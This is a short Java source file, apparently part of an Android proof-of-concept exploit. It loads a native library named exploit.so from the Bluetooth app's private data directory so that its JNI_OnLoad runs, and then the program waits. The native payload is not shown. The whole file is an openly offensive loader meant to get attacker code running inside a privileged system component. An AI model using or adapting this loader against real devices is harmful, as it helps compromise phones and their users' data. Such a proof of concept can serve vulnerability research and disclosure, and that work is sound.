package com.poc;

import android.util.Log;

public class Main {
    private static final String TAG = "Poc";

    static {
        System.load("/data/data/com.android.bluetooth/exploit.so");
    }

    public static void main(String[] args) {
        Log.i(TAG, "DEX loaded. JNI_OnLoad will be called.");
        try {
            Thread.sleep(30000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
